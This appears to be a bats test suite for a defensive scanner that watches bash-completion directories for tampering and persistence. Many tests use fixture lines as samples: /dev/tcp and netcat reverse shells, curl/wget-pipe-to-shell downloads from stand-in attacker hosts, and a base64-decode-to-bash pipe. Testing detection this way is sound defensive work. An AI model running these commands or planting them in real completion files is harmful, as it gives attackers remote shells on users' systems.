#!/usr/bin/env bats
# L2 bats functional tests for the bash-completion-watchdog scan script.
#
# Files in /etc/bash_completion.d (and the XDG completion dirs) are SOURCED
# into every interactive bash login — a per-login root-or-user exec surface.
# A planted completion file that is world-writable / non-root-owned, or
# contains a command-injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-bash-completion-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd/bash-completion-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/bash_completion.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BASHCOMP_PROFILE="${PROFILE:-report}" \
    SELFDEF_BASHCOMP_BASELINE="${BASELINE}" \
    SELFDEF_BASHCOMP_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/bash\ncomplete -W "start stop" mytool\n' > "${HOOKD}/mytool"
}

@test "no bash-completion dir → ok / no_bash_completion" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_bash_completion"'
    cap | grep -q '"severity":"ok"'
}

@test "benign completion, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged completion on second run → ok / bash_completion_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"bash_completion_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a completion file with an injection pattern → alert / bash_completion_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"bash_completion_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable completion file → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign completion change → warn / bash_completion_changed" {
    seed_benign
    run_wd
    printf '#!/bin/bash\ncomplete -W "start stop restart" mytool\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"bash_completion_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned completion file is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious completion file" {
    seed_benign
    run_wd
    printf '#!/bin/bash\ncurl http://evil/p|sh\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — completion inventory enumerates per-login source surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern coverage): /dev/tcp reverse shell in completion → alert" {
    seed_benign
    run_wd
    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in completion → alert" {
    seed_benign
    run_wd
    printf '#!/bin/bash\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation pattern in completion → alert" {
    seed_benign
    run_wd
    printf '#!/bin/bash\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable completion file): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable completion): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/mytool"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED completion file (attacker drops a new hook) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\ncomplete -W "x y" attacker-tool\n' > "${HOOKD}/distinctive-attacker"
    run_wd
    cap | grep -q 'distinctive-attacker'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-bash-completion -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): bash-completion-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1546 per-bash-login source surface — injection alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"bash_completion_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered from completion file body)" {
    # bash-completion files are bash; # comments. Operator notes about
    # hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\ncomplete -W "start stop" mytool\n' > "${HOOKD}/mytool"
    run_wd
    ! cap | grep -q '"event":"bash_completion_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/bash_completion.d + /usr/share/bash-completion/completions + XDG axes — injection in ANY → alert)" {
    # bash-completion sources from multiple dirs (system + user + XDG).
    # Attacker may plant in any. Lock multi-dir axis.
    HOOKD2="${TMP}/bash-completion-completions"; mkdir -p "${HOOKD2}"
    seed_benign
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in the second dir.
    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-completion"
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/mytool"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in bash-completion: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks nc reverse-shell variant INVARIANTs across
    # the brain. Lock the netcat axis on per-bash-login source
    # surface too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/mytool"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
